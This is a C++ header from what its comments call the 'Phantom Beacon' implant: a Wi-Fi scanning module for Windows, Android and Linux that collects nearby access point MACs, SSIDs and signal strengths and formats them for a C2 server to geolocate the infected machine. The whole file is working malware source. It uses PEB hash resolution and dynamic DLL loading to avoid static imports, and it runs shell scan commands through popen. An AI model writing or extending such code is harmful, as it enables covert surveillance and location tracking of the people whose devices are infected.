#pragma once
// ============================================================================
//  wlan_scan.h — Phantom Beacon WLAN Triangulation Scanner
//  ───────────────────────────────────────────────────────
//  Scans nearby Wi-Fi access points to extract BSSID (MAC) and RSSI.
//  Data is sent to the C2 server which uses a Wi-Fi geolocation API
//  to determine precise GPS coordinates (~1m accuracy).
//
//  Windows: Uses Native WLAN API (WlanOpenHandle, WlanGetNetworkBssList)
//  Linux:   Parses output of iwlist/iw scan commands
// ============================================================================

#include <string>
#include <vector>
#include <sstream>

#ifdef _WIN32
    #ifndef WIN32_LEAN_AND_MEAN
    #define WIN32_LEAN_AND_MEAN
    #endif
    #include <windows.h>
    #include <wlanapi.h>
    #pragma comment(lib, "wlanapi.lib")
#else
    #include <cstdio>
    #include <cstring>
    #include <cstdlib>
    #include <unistd.h>
#endif

#include "evasion.h"

namespace wlan_scan {

// Diagnostics buffer for reporting scan failures (raw buffer — no CRT globals)
inline char last_diag[2048];

struct AccessPoint {
    std::string bssid;   // MAC address (e.g., "AA:BB:CC:DD:EE:FF")
    std::string ssid;    // Network name
    int rssi;            // Signal strength in dBm
    int channel;         // Channel number
};

#ifdef _WIN32

// Format a MAC address from 6 bytes
inline std::string format_mac(const unsigned char* mac) {
    char buf[18];
    snprintf(buf, sizeof(buf), "%02X:%02X:%02X:%02X:%02X:%02X",
             mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);
    return std::string(buf);
}

inline std::vector<AccessPoint> scan_access_points() {
    std::vector<AccessPoint> results;

    // Dynamically load wlanapi.dll to avoid static imports
    typedef HMODULE(WINAPI* pLoadLibraryA_t)(LPCSTR);
    auto pLoadLibraryA = (pLoadLibraryA_t)peb::Resolve(peb::HASH_KERNEL32, FN_LOADLIBRARYA);
    if (!pLoadLibraryA) {
        snprintf(last_diag, sizeof(last_diag), "peb::Resolve(LoadLibraryA) failed");
        return results;
    }

    HMODULE hWlanApi = pLoadLibraryA("wlanapi.dll");
    if (!hWlanApi) {
        snprintf(last_diag, sizeof(last_diag), "LoadLibraryA(wlanapi.dll) failed");
        return results;
    }

    // Resolve WLAN API functions
    auto pWlanOpenHandle = (DWORD(WINAPI*)(DWORD, PVOID, PDWORD, PHANDLE))
        GetProcAddress(hWlanApi, "WlanOpenHandle");
    auto pWlanEnumInterfaces = (DWORD(WINAPI*)(HANDLE, PVOID, PWLAN_INTERFACE_INFO_LIST*))
        GetProcAddress(hWlanApi, "WlanEnumInterfaces");
    auto pWlanScan = (DWORD(WINAPI*)(HANDLE, const GUID*, const PDOT11_SSID, PWLAN_RAW_DATA, PVOID))
        GetProcAddress(hWlanApi, "WlanScan");
    auto pWlanGetNetworkBssList = (DWORD(WINAPI*)(HANDLE, const GUID*, const PDOT11_SSID, DOT11_BSS_TYPE, BOOL, PVOID, PWLAN_BSS_LIST*))
        GetProcAddress(hWlanApi, "WlanGetNetworkBssList");
    auto pWlanFreeMemory = (VOID(WINAPI*)(PVOID))
        GetProcAddress(hWlanApi, "WlanFreeMemory");
    auto pWlanCloseHandle = (DWORD(WINAPI*)(HANDLE, PVOID))
        GetProcAddress(hWlanApi, "WlanCloseHandle");

    if (!pWlanOpenHandle || !pWlanEnumInterfaces || !pWlanGetNetworkBssList || !pWlanScan ||
        !pWlanFreeMemory || !pWlanCloseHandle) {
        return results;
    }

    // Open WLAN handle
    HANDLE hClient = NULL;
    DWORD negotiatedVersion = 0;
    DWORD dwRet = pWlanOpenHandle(2, NULL, &negotiatedVersion, &hClient);
    if (dwRet != ERROR_SUCCESS) {
        snprintf(last_diag, sizeof(last_diag),
            "WlanOpenHandle failed: code=%lu", dwRet);
        return results;
    }

    // Enumerate wireless interfaces
    PWLAN_INTERFACE_INFO_LIST pIfList = NULL;
    dwRet = pWlanEnumInterfaces(hClient, NULL, &pIfList);
    if (dwRet != ERROR_SUCCESS) {
        pWlanCloseHandle(hClient, NULL);
        snprintf(last_diag, sizeof(last_diag),
            "WlanEnumInterfaces failed: code=%lu", dwRet);
        return results;
    }

    // 0 interfaces = WLAN service running but no adapter detected
    if (pIfList->dwNumberOfItems == 0) {
        snprintf(last_diag, sizeof(last_diag),
            "WlanEnumInterfaces returned 0 interfaces (WiFi disabled, no driver, or airplane mode)");
        pWlanFreeMemory(pIfList);
        pWlanCloseHandle(hClient, NULL);
        return results;
    }

    // Scan each interface
    char diagBuf[1024];
    int diagLen = 0;
    diagLen += snprintf(diagBuf, sizeof(diagBuf) - diagLen,
        "Found %lu interface(s)\n", pIfList->dwNumberOfItems);
    for (DWORD i = 0; i < pIfList->dwNumberOfItems; i++) {
        WLAN_INTERFACE_INFO& ifInfo = pIfList->InterfaceInfo[i];

        // Add diagnostic info about this interface
        char guidStr[40];
        snprintf(guidStr, sizeof(guidStr),
            "%08X-%04X-%04X-%02X%02X-%02X%02X%02X%02X%02X%02X",
            ifInfo.InterfaceGuid.Data1, ifInfo.InterfaceGuid.Data2,
            ifInfo.InterfaceGuid.Data3,
            ifInfo.InterfaceGuid.Data4[0], ifInfo.InterfaceGuid.Data4[1],
            ifInfo.InterfaceGuid.Data4[2], ifInfo.InterfaceGuid.Data4[3],
            ifInfo.InterfaceGuid.Data4[4], ifInfo.InterfaceGuid.Data4[5],
            ifInfo.InterfaceGuid.Data4[6], ifInfo.InterfaceGuid.Data4[7]);
        const char* stateStr = "unknown";
        switch (ifInfo.isState) {
            case wlan_interface_state_not_ready: stateStr = "not_ready"; break;
            case wlan_interface_state_connected: stateStr = "connected"; break;
            case wlan_interface_state_ad_hoc_network_formed: stateStr = "ad_hoc"; break;
            case wlan_interface_state_disconnecting: stateStr = "disconnecting"; break;
            case wlan_interface_state_disconnected: stateStr = "disconnected"; break;
            case wlan_interface_state_associating: stateStr = "associating"; break;
            case wlan_interface_state_discovering: stateStr = "discovering"; break;
            case wlan_interface_state_authenticating: stateStr = "authenticating"; break;
        }
        diagLen += snprintf(diagBuf + diagLen, sizeof(diagBuf) - diagLen,
            "[IFACE %lu] GUID=%s state=%s\n", i, guidStr, stateStr);

        // Trigger a fresh scan before reading BSS list
        DWORD scanRet = pWlanScan(hClient, &ifInfo.InterfaceGuid, NULL, NULL, NULL);
        if (scanRet != ERROR_SUCCESS) {
            diagLen += snprintf(diagBuf + diagLen, sizeof(diagBuf) - diagLen,
                "  WlanScan returned error %lu\n", scanRet);
            // Try BSS list anyway — sometimes cached data is available
        } else {
            // Wait for scan with polling (up to 8 seconds)
            for (int waitMs = 0; waitMs < 8000; waitMs += 2000) {
                Sleep(2000);
                PWLAN_BSS_LIST pBssList = NULL;
                if (pWlanGetNetworkBssList(hClient, &ifInfo.InterfaceGuid, NULL,
                                           dot11_BSS_type_any, FALSE, NULL, &pBssList) == ERROR_SUCCESS) {
                    DWORD nItems = pBssList->dwNumberOfItems;
                    if (nItems > 0) {
                        pWlanFreeMemory(pBssList);
                        break; // Got results, exit wait loop
                    }
                    pWlanFreeMemory(pBssList);
                }
            }
        }

        // Get BSS list (nearby access points)
        PWLAN_BSS_LIST pBssList = NULL;
        if (pWlanGetNetworkBssList(hClient, &ifInfo.InterfaceGuid, NULL,
                                   dot11_BSS_type_any, FALSE, NULL, &pBssList) != ERROR_SUCCESS) {
            diagLen += snprintf(diagBuf + diagLen, sizeof(diagBuf) - diagLen,
                "  WlanGetNetworkBssList failed\n");
            continue;
        }

        for (DWORD j = 0; j < pBssList->dwNumberOfItems; j++) {
            WLAN_BSS_ENTRY& bssEntry = pBssList->wlanBssEntries[j];

            AccessPoint ap;
            ap.bssid = format_mac(bssEntry.dot11Bssid);
            ap.rssi = (int)bssEntry.lRssi;
            ap.channel = 0; // Can be derived from frequency if needed

            // Extract SSID
            if (bssEntry.dot11Ssid.uSSIDLength > 0) {
                ap.ssid = std::string((char*)bssEntry.dot11Ssid.ucSSID,
                                     bssEntry.dot11Ssid.uSSIDLength);
            } else {
                ap.ssid = "<hidden>";
            }

            // Derive channel from center frequency (2.4GHz band)
            ULONG freqKHz = bssEntry.ulChCenterFrequency;
            if (freqKHz >= 2412000 && freqKHz <= 2484000) {
                ap.channel = (freqKHz - 2407000) / 5000;
            } else if (freqKHz >= 5180000 && freqKHz <= 5825000) {
                ap.channel = (freqKHz - 5000000) / 5000;
            }

            results.push_back(ap);
        }

        pWlanFreeMemory(pBssList);
    }

    // Store diagnostic info for error reporting
    if (results.empty() && diagLen > 0) {
        diagBuf[diagLen] = '\0';
        size_t cp = (diagLen < (int)sizeof(last_diag) - 1) ? diagLen : sizeof(last_diag) - 1;
        memcpy(last_diag, diagBuf, cp);
        last_diag[cp] = '\0';
    } else if (results.empty()) {
        last_diag[0] = '\0';
    }

    pWlanFreeMemory(pIfList);
    pWlanCloseHandle(hClient, NULL);
    return results;
}

#elif defined(__ANDROID__)

// ── Root: direct iw scan via popen (requires root + busybox/iw) ──────────────
inline std::vector<AccessPoint> scan_access_points_root() {
    std::vector<AccessPoint> results;
    // On rooted Android, iw/iwlist may be available via busybox
    FILE* fp = popen("iw dev 2>/dev/null | grep Interface | head -1 | awk '{print $2}'", "r");
    if (!fp) return results;
    char iface[64] = {0};
    if (!fgets(iface, sizeof(iface), fp)) { pclose(fp); return results; }
    pclose(fp);
    size_t len = strlen(iface);
    if (len > 0 && iface[len - 1] == '\n') iface[len - 1] = '\0';
    if (strlen(iface) == 0) return results;

    std::string cmd = std::string("iw dev ") + iface + " scan 2>/dev/null";
    fp = popen(cmd.c_str(), "r");
    if (!fp) {
        // Fallback to iwlist
        cmd = std::string("iwlist ") + iface + " scan 2>/dev/null";
        fp = popen(cmd.c_str(), "r");
        if (!fp) return results;
    }

    char line[512];
    AccessPoint current;
    bool in_ap = false;
    while (fgets(line, sizeof(line), fp)) {
        std::string l(line);
        if (l.find("BSS ") != std::string::npos || l.find("Cell ") != std::string::npos) {
            if (in_ap && !current.bssid.empty()) results.push_back(current);
            current = AccessPoint();
            in_ap = true;
            size_t bss = l.find("BSS ");
            if (bss == std::string::npos) bss = l.find("Cell ");
            size_t addr = l.find_first_of("0123456789ABCDEF", bss + 4);
            if (addr != std::string::npos) current.bssid = l.substr(addr, 17);
            continue;
        }
        if (!in_ap) continue;
        size_t p;
        if ((p = l.find("ESSID:")) != std::string::npos) {
            size_t q = l.find('"', p + 6);
            if (q != std::string::npos) {
                size_t r = l.find('"', q + 1);
                current.ssid = l.substr(q + 1, r - q - 1);
            }
        } else if ((p = l.find("Signal level=")) != std::string::npos) {
            current.rssi = atoi(l.c_str() + p + 13);
        } else if ((p = l.find("Frequency:")) != std::string::npos || (p = l.find("Frequency=")) != std::string::npos) {
            int freq = atoi(l.c_str() + p + (l[p+9] == ':' ? 10 : 10));
            if (freq >= 2412 && freq <= 2484)
                current.channel = (freq - 2407) / 5;
            else if (freq >= 5180 && freq <= 5825)
                current.channel = (freq - 5000) / 5;
            else
                current.channel = 0;
        }
    }
    if (in_ap && !current.bssid.empty()) results.push_back(current);
    pclose(fp);
    return results;
}

// ── Non-root: use 'cmd wifi' shell (requires system UID or DUMP permission) ──
inline std::vector<AccessPoint> scan_access_points_user() {
    std::vector<AccessPoint> results;

    FILE* fp = popen("cmd wifi start-scan 2>/dev/null; sleep 2; cmd wifi list-scan-results 2>/dev/null", "r");
    if (!fp) return results;

    char line[512];
    bool header = true;
    while (fgets(line, sizeof(line), fp)) {
        if (header) { header = false; continue; }
        std::string l(line);
        if (l.length() < 20) continue;

        AccessPoint ap;
        ap.bssid = l.substr(0, 17);
        size_t freq_end = l.find("  ", 18);
        if (freq_end == std::string::npos) continue;
        int freq = atoi(l.substr(18, freq_end - 18).c_str());
        if (freq >= 2412000 && freq <= 2484000)
            ap.channel = (freq - 2407000) / 5000;
        else if (freq >= 5180000 && freq <= 5825000)
            ap.channel = (freq - 5000000) / 5000;
        else
            ap.channel = 0;

        size_t rssi_start = freq_end + 2;
        size_t rssi_end = l.find("  ", rssi_start);
        if (rssi_end == std::string::npos) continue;
        ap.rssi = atoi(l.substr(rssi_start, rssi_end - rssi_start).c_str());

        size_t ssid_start = rssi_end + 2;
        ap.ssid = l.substr(ssid_start);
        while (!ap.ssid.empty() && (ap.ssid.back() == '\n' || ap.ssid.back() == '\r'))
            ap.ssid.pop_back();

        results.push_back(ap);
    }
    pclose(fp);
    return results;
}

inline std::vector<AccessPoint> scan_access_points() {
    if (getuid() == 0) return scan_access_points_root();
    return scan_access_points_user();
}

#else // Linux / macOS

inline std::vector<AccessPoint> scan_access_points() {
    std::vector<AccessPoint> results;

    // Try iw first (modern), then iwlist (legacy)
    FILE* fp = popen("iw dev 2>/dev/null | grep Interface | head -1 | awk '{print $2}'", "r");
    if (!fp) return results;

    char iface[64] = {0};
    if (!fgets(iface, sizeof(iface), fp)) {
        pclose(fp);
        return results;
    }
    pclose(fp);

    // Remove newline
    size_t len = strlen(iface);
    if (len > 0 && iface[len - 1] == '\n') iface[len - 1] = '\0';
    if (strlen(iface) == 0) return results;

    // Run scan (requires root or CAP_NET_ADMIN)
    std::string cmd = std::string("iwlist ") + iface + " scan 2>/dev/null";
    fp = popen(cmd.c_str(), "r");
    if (!fp) return results;

    char line[512];
    AccessPoint current;
    bool in_cell = false;

    while (fgets(line, sizeof(line), fp)) {
        std::string l(line);

        // New cell = new AP
        if (l.find("Cell ") != std::string::npos && l.find("Address:") != std::string::npos) {
            if (in_cell && !current.bssid.empty()) {
                results.push_back(current);
            }
            current = AccessPoint();
            in_cell = true;

            size_t pos = l.find("Address: ");
            if (pos != std::string::npos) {
                current.bssid = l.substr(pos + 9);
                // Trim whitespace
                while (!current.bssid.empty() && (current.bssid.back() == '\n' || current.bssid.back() == '\r' || current.bssid.back() == ' '))
                    current.bssid.pop_back();
            }
        }
        else if (l.find("ESSID:") != std::string::npos) {
            size_t start = l.find('"');
            size_t end = l.rfind('"');
            if (start != std::string::npos && end != std::string::npos && end > start) {
                current.ssid = l.substr(start + 1, end - start - 1);
            }
        }
        else if (l.find("Signal level=") != std::string::npos) {
            size_t pos = l.find("Signal level=");
            if (pos != std::string::npos) {
                current.rssi = atoi(l.c_str() + pos + 13);
            }
        }
        else if (l.find("Channel:") != std::string::npos) {
            size_t pos = l.find("Channel:");
            if (pos != std::string::npos) {
                current.channel = atoi(l.c_str() + pos + 8);
            }
        }
    }
    if (in_cell && !current.bssid.empty()) {
        results.push_back(current);
    }

    pclose(fp);
    return results;
}

#endif

// ── Format output for C2 transmission ──────────────────────────────────────

inline std::string scan() {
    auto aps = scan_access_points();
    if (aps.empty()) {
        if (last_diag[0] != '\0')
            return "WLAN scan: No access points found.\n" + std::string("[DEBUG] ") + last_diag;
        return "WLAN scan: No access points found (adapter may be unavailable).";
    }

    std::ostringstream out;
    out << "=== WLAN SCAN RESULTS (" << aps.size() << " APs) ===\n";
    out << "BSSID              | RSSI | Ch | SSID\n";
    out << "-------------------+------+----+---------------------------\n";
    for (const auto& ap : aps) {
        char line[256];
        snprintf(line, sizeof(line), "%-18s | %4d | %2d | %s\n",
                 ap.bssid.c_str(), ap.rssi, ap.channel, ap.ssid.c_str());
        out << line;
    }
    return out.str();
}

// ── Format as JSON for geolocation API ─────────────────────────────────────

inline std::string scan_json() {
    auto aps = scan_access_points();
    if (aps.empty()) {
        if (last_diag[0] != '\0')
            return "WLAN_GEOLOCATE: No access points found.\n[DEBUG] " + std::string(last_diag);
        return "WLAN_GEOLOCATE: No access points found (adapter may be unavailable).";
    }

    std::ostringstream out;
    out << "WLAN_GEOLOCATE:[";
    for (size_t i = 0; i < aps.size(); i++) {
        if (i > 0) out << ",";
        out << "{\"macAddress\":\"" << aps[i].bssid
            << "\",\"ssid\":\"" << aps[i].ssid
            << "\",\"signalStrength\":" << aps[i].rssi
            << ",\"channel\":" << aps[i].channel << "}";
    }
    out << "]";
    return out.str();
}

} // namespace wlan_scan
